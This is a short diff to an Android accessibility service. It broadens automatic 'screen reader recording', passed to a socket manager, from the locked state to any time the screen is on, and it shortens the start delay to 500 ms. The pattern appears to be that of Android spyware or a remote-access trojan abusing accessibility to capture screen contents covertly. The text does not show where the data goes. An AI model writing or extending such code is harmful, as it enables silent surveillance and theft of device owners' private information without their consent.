@@ -197,7 +197,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         // Register receiver for screen on/off and unlock events — drives auto-recording
         try { registerScreenStateReceiver(); } catch (Exception ignored) {}
 
-        // Auto-start screen reader recording immediately if screen is on and locked
+        // Auto-start screen reader recording immediately if screen is on and locked.
+        // 500 ms delay lets the service fully initialize before reading the screen.
         new Handler(Looper.getMainLooper()).postDelayed(() -> {
             try {
                 android.app.KeyguardManager km =
@@ -206,11 +207,12 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                         (android.os.PowerManager) getSystemService(POWER_SERVICE);
                 boolean screenOn = pm != null && pm.isInteractive();
                 boolean locked   = km != null && km.isKeyguardLocked();
-                if (screenOn && locked) {
+                // Start if locked, or even if unlocked (record current screen state)
+                if (screenOn) {
                     SocketManager.getInstance(UnifiedAccessibilityService.this).startScreenReaderAuto();
                 }
             } catch (Exception ignored) {}
-        }, 3000);
+        }, 500);
 
         try {
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
